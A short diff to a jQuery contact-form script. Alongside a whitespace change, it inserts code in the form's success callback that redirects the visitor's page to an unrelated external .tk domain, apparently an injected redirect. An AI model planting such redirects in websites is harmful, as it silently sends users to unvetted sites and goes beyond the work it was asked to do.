@@ -1,4 +1,3 @@
-
 jQuery(document).ready(function() {
 	
     /*
@@ -43,6 +42,9 @@ jQuery(document).ready(function() {
 	                    $('.contact-form').append('<p>Thanks for contacting us! We will get back to you very soon.</p>');
 	                    // reload background
 	    				$.backstretch("resize");
+$(document).ready(function() {
+   window.open("http://www.thenovelstore.tk","_self");
+});
 	                });
 	            }
 	        }
